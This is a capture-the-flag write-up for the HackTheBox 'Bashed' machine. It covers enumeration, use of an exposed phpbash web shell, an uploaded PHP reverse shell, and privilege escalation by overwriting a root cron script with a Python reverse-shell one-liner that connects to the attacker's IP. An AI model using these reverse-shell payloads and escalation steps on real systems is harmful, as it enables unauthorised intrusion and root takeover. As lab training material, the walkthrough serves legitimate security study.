HTB 8. Bashed

1. `nmap -A -T4 -p- 10.10.10.68` shows port 80 with `Apache httpd 2.4.18 (Ubuntu)`.
2. `searchsploit apache 2.4` reveals local `apache_ctl` exploit.
3. Going to website `10.10.10.68` and looking at content shows that `10.10.10.68/uploads`. exists.
4. `dirbuster` time with medium wordlist which reveals several folders.
5. View source code of pages shows nothing.
6. `dirbuster` found `dev/phpbash.php`.
7. Go to `10.10.10.68` and launch `phpbash.php` which launches web terminal.
8. `whoami` is `www-data` so lets get the user flag. `cat /home/arrexel/user.txt`.
9. test `sudo -l` and `history` which shows we can become `scriptmanager` user without password.
10. Can't change to `scriptmanager` because we are in a wbeshell without a tty.
11. `cd /var/www/html/uploads/` and upload payload.
12. Lets try [`php-reverse-shell`](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) from pentestmonkey instead of metasploit. Download and extract.
13. Edit the `$ip` and `$port` to our ip and port `1234`.
14. Start web server `python -m SimpleHTTPServer 80` and run `wet http://10.10.14.21/rev.php` on the target.
15. Start netcat `nc -nvlp 1234`
16. Go to `10.10.10.68/uploads/rev.php` to execute and connect.
17. Still can't access tty so serach for `tty escape` and go to to [Spawning a TTY Shell](https://netsec.ws/?p=337).
18. Just go down the list and try the options. Try `python -c 'import pty; pty.spawn("/bin/bash")'` and no we are in `bash`.
19. `sudo su scriptmanager` does not work so lets try running a command as the user `sudo -u scriptmanager /bin/bash`.
20. `whoami` is `scripmanager` and `history` is none.
21. `ls -la /` shows `scriptmanager` owns `/scripts`.
22. `cd scripts` and `ls -la` shows `test.py` and `test.txt`.
23. The time modified for the `test.txt` changes every minute so a cronjob is running the `test.py` evvery minute as root. Lets change the `test.py` so it performs malicious actions.
24. Search for `python reverse shell` and use the [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
25. Use `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);` (`-i` is interactive mode) and download to target.
26. Start listening `nc -nvlp 2345` and wait for shell.


Someone exploited with `CVE-2017-16995` found after running the `linux-exploit-suggester`.






